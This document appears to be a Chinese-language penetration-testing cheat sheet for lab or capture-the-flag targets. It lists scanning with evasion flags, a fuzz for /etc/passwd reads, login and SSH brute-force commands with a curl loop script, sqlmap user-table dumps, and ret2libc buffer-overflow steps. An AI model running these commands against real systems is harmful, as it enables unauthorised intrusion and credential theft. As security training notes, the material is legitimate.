...
nmap -sT --min-rate 10000 -p- 192.168.13.129 -oN nmap/scan_sT

nmap -sU --min-rate 10000 -p- 192.168.13.129 -oN nmap/scan_sU

nmap -sT -sC -sV -O -p22,80 192.168.13.129 -oN nmap/scan_sT_detail

nmap --script=vuln -p22,80 192.168.13.129 -oN nmap/scan_vuln

-f #分段数据包

-g/--source-port #源端口流量伪造 example: -g 53 伪造为dns流量

-r #顺序扫描

--scanflags #改变tcp标志位 example: --scanflags URGPSHFIN
...
```
nc 192.168.49.1 1440 #连接192.168.49.1的tcp(1440)端口

nc -u 192.168.49.1 1440 #连接192.168.49.1的udp(1440)端口
```

#### 流量分析

```
tshark -i eth0 -f "host 192.168.49.1" -w tshark_listen.pcap #监听指定主机流量,保存到tshark_listen.pcap文件中。

tshark -r tshark_listen.pcap -V -T fields -e data #读取指定的流量包 -V 显示流量包详细信息 -T 提取fields字段 -e 打印出字段
```

#### 端口敲门

```
knock 192.168.49.1 555 666 777 888 -v #端口敲门，输入四个端口号555，666，777，888,会开放特定端口
```
...
```
whatweb "http://192.168.13.129:80"

nikto -host "http://192.168.13.129:80"

wpscan --url "http://192.168.13.129:80" #wordpress

joomscan --url "fsociety.web:8081" #joomla
```

#### 目录扫描

```
dirsearch -u "http://192.168.13.129:80" -w "md5_pass" [-e html,js,php,aspx,jsp,txt,zip,bak]

gobuster dir -u "http://192.168.13.129:80" -w "md5_pass" [-x html,js,php,aspx,jsp,txt,zip,bak] [--rua]

feroxbuster -u "http://192.168.13.129:80" -w "md5_pass" -x html,js,php,aspx,jsp,txt,zip,bak

dirb "http://192.168.13.129:80" "md5_pass" -X .html,.js,.php,.aspx,.jsp,.txt,.zip,.bak
```

#### 模糊测试

```
wfuzz -u "http://192.168.13.129/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd" -w "/usr/share/wordlists/dirb/big.txt" --hw 0

ffuf -u "http://192.168.13.129/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd" -w "/usr/share/wordlists/dirb/big.txt" -fw 1
```

#### 登录爆破

```
wfuzz -c -u "http://terratest.earth.local/admin/login" -b "csrftoken=3qgrLe7AxCC7hXPuM9oh8lPxSTzI1wpQFMWISp5WDhh41RcV5V27aNL4HvNxuiS9" -d "csrfmiddlewaretoken=sNy9hFgWBSSwALQgLzVbxvBfobc7WJMY49eqoQeiHxxtkFdH4lz1zXxMdNqWpvfh&username=FUZZ&password=FUZ2Z" -z file,user.txt -z file,pass.txt --hw 67

#!/bin/bash
length_last=""
for pass in $(cat pass.txt);do 
        for user in $(cat user.txt);do 
                length=$(curl -s http://terratest.earth.local/admin/login -b "csrftoken=3qgrLe7AxCC7hXPuM9oh8lPxSTzI1wpQFMWISp5WDhh41RcV5V27aNL4HvNxuiS9" -X POST --data="csrfmiddlewaretoken=sNy9hFgWBSSwALQgLzVbxvBfobc7WJMY49eqoQeiHxxtkFdH4lz1zXxMdNqWpvfh&username=${user}&password=${pass}" | wc -l);
        if [ -z "$length_last" ];then 
                length_last=$length ;
        fi;
        if (( length != length_last ));then 
                echo "${user},${pass} is user and pass";break 2;
        fi;
        done;
done
#以curl爆破登录页面正确和错误导致的页面大小不同，和前一个页面的大小不同的，就为正确页面，此时，输出用户名和密码
```
...
curl #-s 静默输出 
      ...
      -b cookie.txt 使用保存的cookie
      -X POST -d "" 使用post表单提交
      -H "" 设置请求参数 example -H "Cookie: xxxxx"
...
sqlmap -u "http://fsociety.web:8081/index.php?admin=*" --dbs --batch #库名

sqlmap -u "http://fsociety.web:8081/index.php?admin=*" -D "joomla_db" --tables --batch #表名

sqlmap -u "http://fsociety.web:8081/index.php?admin=*" -D "joomla_db" -T "hs23w_users" --columns --batch #列名

sqlmap -u "http://fsociety.web:8081/index.php?admin=*" -D "joomla_db" -T "hs23w_users" -C "username,password,name,email" --dump --batch #值名
```
...
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #目录扫描
...
```
hydra -l freddie -P md5_pass ssh://192.168.13.129
```
...
```
echo "abc" | xxd #将字符串转换为16进制

echo "6162630a" | xxd -r -p # -r 将16进制转回2进制/文本， -p 打印为纯文本
```
...
-b	以八进制字节显示（等价于 -t o1）
-c	以 ASCII 字符或转义序列显示（等价于 -t c）
-d	以无符号十进制显示（等价于 -t u2 或 -t u4，取决于字长）
-f	以浮点数显示（等价于 -t f4 或 -t f8）
-i	以有符号十进制显示（等价于 -t d2 或 -t d4）
-o	以八进制显示（默认，等价于 -t o2）
-x	以十六进制显示（等价于 -t x2）
-t 类型	更灵活地指定类型，如 -t x1（单字节十六进制）、-t u4（4 字节无符号十进制）等
```
...
```
steghide embed -cf 载体文件 -ef 待隐藏文件 #需要输入加密密码

steghide extract -sf 隐写文件 #需要输入解密密码
```
...
```
apt install gdb && apt install gdb-peda
gdb x
(gdb)source /usr/share/gdb-peda/peda.py
gdb-peda$checksec #显示安全机制
gdb-peda$disassemble main #查看主程序的反汇编
```
...
cannary(栈保护)
先行cookie保护，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。起源于矿洞&金丝雀。

FORTIFY
检查是否存在缓冲区溢出错误。（memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符）

NX(DEP)
no-execute(不可执行)，将数据所在内存也标识位不可执行，当程序溢出成功转入shellcode运行时，cpu会抛出异常。

PIE(ASLR)
地址空间分布随机化(ASLR)，防范基于Ret2libc方式的针对DEP的攻击。
```
...
```
ASLR防范这种攻击。
ldd x #多次执行ldd x 命令，如果发现动态链接库是动态的，那么ASLR存在。
cat /proc/sys/kernel/randomize_va_space #内存ASLR 0不开启 1部分开启 2完全开启

32位程序可以"撞"
原理为32位二进制执行时，内存空间变化小，内存装载可能存在多次重复利用。
利用：
ldd x #查看libc等动态链接库位置
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)@@" #查看libc的地址中的system和exit函数位置
strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -E /bin/sh #查看sh的地址

./x $(msf-pattern_create -l 100)
dmesg | tail #查看段错误导致的eip地址偏移
msf-pattern_offset -l 100 -q 0x63413539 #查看溢出位置
...
offset = b"A" * 76 #设定溢出点
libc = 0xb7575000 #libc地址
system = pack("<I",libc + 0x00040310) #lib地址+system地址偏移量
...
```
./shell.elf $(python -c "print("A"*100)") #Segmentation fault
dmesg | tail #查看内核日志
```
